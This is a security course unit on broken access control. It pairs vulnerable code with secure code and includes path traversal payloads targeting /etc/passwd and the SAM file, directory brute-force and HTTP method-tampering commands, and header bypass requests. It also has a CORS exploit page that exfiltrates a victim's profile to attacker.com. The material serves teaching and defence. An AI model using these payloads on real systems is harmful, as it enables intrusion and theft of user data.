# Unit 1: A01 - Broken Access Control — Topic 2: Common Weaknesses

## Overview

Broken access control encompasses a wide range of **Common Weakness Enumerations (CWEs)** that allow attackers to act outside their intended permissions. OWASP mapped **34 CWEs** to this category — the most of any Top 10 category — including path traversal, forced browsing, CORS misconfiguration, and missing function-level access control. Understanding each weakness pattern is essential for systematic testing and remediation.

---

## 1. CWE Mapping for A01

| CWE ID | Name | Prevalence |
|--------|------|-----------|
| CWE-200 | Exposure of Sensitive Information | Very High |
| CWE-201 | Insertion of Sensitive Information Into Sent Data | High |
| CWE-352 | Cross-Site Request Forgery | High |
| CWE-284 | Improper Access Control | Very High |
| CWE-285 | Improper Authorization | Very High |
| CWE-639 | Authorization Bypass Through User-Controlled Key | High |
| CWE-22 | Improper Limitation of a Pathname to a Restricted Directory (Path Traversal) | High |
| CWE-425 | Direct Request (Forced Browsing) | Medium |
| CWE-862 | Missing Authorization | High |
| CWE-863 | Incorrect Authorization | High |

---

## 2. Path Traversal (CWE-22)

Path traversal allows attackers to access files outside the intended directory by manipulating file path parameters.

### Attack Flow

```
┌──────────┐                         ┌──────────────────────┐
│ Attacker │                         │    Web Server         │
├──────────┤                         ├──────────────────────┤
│          │  GET /download?file=    │                      │
│          │  ../../../etc/passwd    │  Intended: /uploads/ │
│          │────────────────────────▶│  Accessed: /etc/     │
│          │                         │                      │
│          │◀────────────────────────│  root:x:0:0:root...  │
│          │  200 OK (file contents) │                      │
└──────────┘                         └──────────────────────┘
```

### Common Payloads

```
# Basic traversal
../../../etc/passwd
..\..\..\windows\system32\config\sam

# URL encoding
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double URL encoding
%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Null byte injection (older systems)
../../../etc/passwd%00.jpg

# Unicode/UTF-8
..%c0%af..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd

# Windows-specific
..\..\..\..\windows\win.ini
....//....//....//etc/passwd
```

### Vulnerable vs Secure Code

```python
# VULNERABLE — No path validation
@app.route('/download')
def download_file():
    filename = request.args.get('file')
    filepath = os.path.join('/var/www/uploads', filename)
    return send_file(filepath)
    # Attacker: /download?file=../../../etc/passwd

# SECURE — Path validation with realpath
@app.route('/download')
def download_file():
    filename = request.args.get('file')
    
    # Construct the intended path
    base_dir = os.path.realpath('/var/www/uploads')
    filepath = os.path.realpath(os.path.join(base_dir, filename))
    
    # Verify the resolved path is within the base directory
    if not filepath.startswith(base_dir):
        abort(403, 'Access denied')
    
    # Verify file exists
    if not os.path.isfile(filepath):
        abort(404, 'File not found')
    
    return send_file(filepath)
```

```java
// SECURE — Java path validation
public File getSecureFile(String userInput) throws SecurityException {
    Path basePath = Paths.get("/var/www/uploads").toRealPath();
    Path resolvedPath = basePath.resolve(userInput).normalize().toRealPath();
    
    if (!resolvedPath.startsWith(basePath)) {
        throw new SecurityException("Path traversal attempt detected");
    }
    
    return resolvedPath.toFile();
}
```

---

## 3. Forced Browsing (CWE-425)

Forced browsing occurs when an attacker **directly requests URLs** that should be protected but aren't enforced server-side.

### Attack Scenarios

```
Normal User Flow:
  /login → /dashboard → /profile

Forced Browsing Attack:
  /admin/dashboard          ← Directly accessed without admin role
  /api/v1/users             ← No authentication check
  /backup/database.sql      ← Sensitive file exposed
  /debug/phpinfo.php        ← Debug page left in production
  /api/internal/config      ← Internal API exposed
```

### Common Forced Browsing Targets

| Category | Example URLs |
|----------|-------------|
| **Admin panels** | `/admin`, `/administrator`, `/wp-admin`, `/manage` |
| **Debug pages** | `/debug`, `/phpinfo.php`, `/server-status`, `/elmah.axd` |
| **Backup files** | `/backup.sql`, `/db.bak`, `/config.old`, `/.env` |
| **API documentation** | `/swagger`, `/api-docs`, `/graphql/playground` |
| **Source code** | `/.git/HEAD`, `/.svn/entries`, `/WEB-INF/web.xml` |
| **Config files** | `/web.config`, `/application.yml`, `/.htpasswd` |

### Testing with ffuf

```bash
# Directory brute force
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt \
    -mc 200,301,302,403 -fc 404

# With authentication (testing if pages are accessible without proper role)
ffuf -u http://target.com/admin/FUZZ \
    -w /usr/share/seclists/Discovery/Web-Content/common.txt \
    -H "Cookie: session=low_priv_user_cookie" \
    -mc 200
```

---

## 4. Missing Function-Level Access Control (CWE-862)

The application properly renders UI based on roles but fails to enforce access control on the **server-side API/function calls**.

### Attack Pattern

```
┌────────────────────────────────────────────────────────────────┐
│                CLIENT-SIDE vs SERVER-SIDE CONTROL              │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  BROWSER (Normal User):                                       │
│  ┌──────────────────────────────────────────────┐             │
│  │  Dashboard                                    │             │
│  │  ┌──────┐  ┌──────┐                          │             │
│  │  │ View │  │ Edit │   [Delete] ← hidden      │             │
│  │  └──────┘  └──────┘   by CSS/JS              │             │
│  └──────────────────────────────────────────────┘             │
│                                                                │
│  ATTACKER (bypasses UI):                                      │
│  curl -X DELETE http://target.com/api/users/1                 │
│  → Server processes request without checking role!             │
│                                                                │
│  SECURE:                                                       │
│  Server checks: user.hasPermission('users:delete')            │
│  → 403 Forbidden                                               │
└────────────────────────────────────────────────────────────────┘
```

### Vulnerable vs Secure Code

```javascript
// VULNERABLE — Client-side only hiding
// Frontend hides the button, but API has no check
app.delete('/api/users/:id', async (req, res) => {
    // No authorization check!
    await User.findByIdAndDelete(req.params.id);
    res.json({ message: 'User deleted' });
});

// SECURE — Server-side enforcement
app.delete('/api/users/:id', authenticate, async (req, res) => {
    // Check permission server-side
    if (!req.user.permissions.includes('users:delete')) {
        return res.status(403).json({ error: 'Forbidden' });
    }
    
    await User.findByIdAndDelete(req.params.id);
    auditLog.info(`User ${req.params.id} deleted by ${req.user.id}`);
    res.json({ message: 'User deleted' });
});
```

---

## 5. Metadata Manipulation

Attackers tamper with **hidden fields, cookies, JWT tokens, or HTTP headers** to escalate privileges.

### Attack Vectors

```
1. HIDDEN FORM FIELDS
   <input type="hidden" name="role" value="user">
   Attacker changes to: value="admin"

2. COOKIES
   Set-Cookie: role=user; isAdmin=false
   Attacker changes to: role=admin; isAdmin=true

3. HTTP HEADERS
   X-Forwarded-For: 127.0.0.1    ← Bypass IP restrictions
   X-Original-URL: /admin         ← Bypass URL-based rules
   X-Rewrite-URL: /admin

4. JWT CLAIMS
   {"sub": "user123", "role": "user"}
   Attacker modifies to: {"sub": "user123", "role": "admin"}
```

### Header-Based Bypass Example

```
# Some reverse proxies use X-Original-URL for routing
# Application blocks /admin at proxy level but trusts the header

# Normal (blocked):
GET /admin HTTP/1.1
→ 403 Forbidden

# Bypass:
GET /anything HTTP/1.1
X-Original-URL: /admin
→ 200 OK (access granted!)

# Another bypass:
GET /admin HTTP/1.1
X-Rewrite-URL: /admin
→ 200 OK
```

---

## 6. CORS Misconfiguration (CWE-942)

Cross-Origin Resource Sharing misconfigurations can allow **unauthorized cross-origin access** to sensitive APIs.

### Misconfiguration Types

```
┌────────────────────────────────────────────────────────────────┐
│                   CORS MISCONFIGURATION TYPES                  │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  1. WILDCARD ORIGIN WITH CREDENTIALS                          │
│     Access-Control-Allow-Origin: *                            │
│     Access-Control-Allow-Credentials: true                    │
│     ← Browsers block this, but still dangerous                │
│                                                                │
│  2. REFLECTED ORIGIN                                          │
│     Request:  Origin: https://evil.com                        │
│     Response: Access-Control-Allow-Origin: https://evil.com   │
│               Access-Control-Allow-Credentials: true          │
│     ← Server reflects any origin = VULNERABLE                │
│                                                                │
│  3. NULL ORIGIN ALLOWED                                       │
│     Access-Control-Allow-Origin: null                         │
│     ← Sandboxed iframes send null origin                     │
│                                                                │
│  4. SUBDOMAIN WILDCARD                                        │
│     Trusts: *.target.com                                      │
│     Attacker uses: evil.target.com (if they control subdomain)│
│                                                                │
│  5. PREFIX/SUFFIX MATCHING                                    │
│     Trusts origins ending in: target.com                      │
│     Attacker uses: eviltarget.com                             │
└────────────────────────────────────────────────────────────────┘
```

### Testing CORS

```bash
# Check for reflected origin
curl -s -D - -H "Origin: https://evil.com" https://target.com/api/user \
    | grep -i "access-control"

# Check for null origin
curl -s -D - -H "Origin: null" https://target.com/api/user \
    | grep -i "access-control"

# Exploitation (if reflected origin + credentials)
# Host this on attacker site:
```

```html
<!-- CORS exploitation page -->
<script>
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState === 4) {
        // Exfiltrate data
        fetch('https://attacker.com/log?data=' + btoa(xhr.responseText));
    }
};
xhr.open('GET', 'https://vulnerable.com/api/user/profile', true);
xhr.withCredentials = true;
xhr.send();
</script>
```

### Secure CORS Configuration

```python
# SECURE — Flask CORS with explicit whitelist
from flask_cors import CORS

ALLOWED_ORIGINS = [
    'https://app.example.com',
    'https://admin.example.com',
]

CORS(app, origins=ALLOWED_ORIGINS, supports_credentials=True)
```

```javascript
// SECURE — Express.js CORS
const cors = require('cors');

const corsOptions = {
    origin: (origin, callback) => {
        const whitelist = ['https://app.example.com', 'https://admin.example.com'];
        if (!origin || whitelist.includes(origin)) {
            callback(null, true);
        } else {
            callback(new Error('Not allowed by CORS'));
        }
    },
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization'],
};

app.use(cors(corsOptions));
```

---

## 7. HTTP Method Tampering

Applications may only enforce access control for certain HTTP methods, leaving others unprotected.

```
# Application checks authorization for POST but not PUT/PATCH
POST /api/users/1 → 403 Forbidden (correctly blocked)
PUT  /api/users/1 → 200 OK (method not checked!)

# Override method headers
POST /api/admin/delete-user HTTP/1.1
X-HTTP-Method-Override: DELETE
X-HTTP-Method: DELETE
X-Method-Override: DELETE

# Testing all methods
for method in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -X $method http://target.com/admin/users)
    echo "$method → $code"
done
```

---

## 8. Directory Listing (CWE-548)

When web servers expose directory contents, attackers can discover sensitive files.

```
# Apache directory listing
http://target.com/uploads/
→ Index of /uploads/
  backup.sql          2024-01-15  45MB
  credentials.txt     2024-01-10  2KB
  admin-notes.md      2024-01-08  5KB

# Nginx directory listing check
location /files/ {
    autoindex on;    ← VULNERABLE
}

# Disable directory listing
# Apache: Options -Indexes in .htaccess
# Nginx:  autoindex off;
# IIS:    Remove Directory Browsing feature
```

---

## Summary Table

| Weakness | CWE | Impact | Testing Method |
|----------|-----|--------|----------------|
| **Path Traversal** | CWE-22 | File read/write | `../` payloads in file parameters |
| **Forced Browsing** | CWE-425 | Unauthorized page access | ffuf/dirb directory brute force |
| **Missing Function Auth** | CWE-862 | Unauthorized operations | Direct API calls without role |
| **Metadata Manipulation** | CWE-639 | Privilege escalation | Tamper hidden fields/headers |
| **CORS Misconfiguration** | CWE-942 | Cross-origin data theft | Reflected origin test |
| **Method Tampering** | — | Auth bypass | Test all HTTP methods |
| **Directory Listing** | CWE-548 | Information disclosure | Browse directory paths |

---

## Revision Questions

1. What is path traversal? List five different encoding techniques attackers use to bypass path traversal filters.
2. Explain the difference between client-side UI hiding and server-side access control enforcement. Why is client-side hiding alone dangerous?
3. How does a CORS reflected origin vulnerability work? Write a JavaScript exploit that exfiltrates user data from a vulnerable API.
4. What is forced browsing? List 10 common URLs an attacker would try to access directly.
5. How can HTTP method tampering bypass access controls? Write a Bash script that tests all HTTP methods against a protected endpoint.
6. What is the `X-Original-URL` header bypass? Against what types of architectures does it work?

---

*Previous: [01-access-control-concepts.md](01-access-control-concepts.md) | Next: [03-idor-vulnerabilities.md](03-idor-vulnerabilities.md)*

---

*[Back to README](../README.md)*
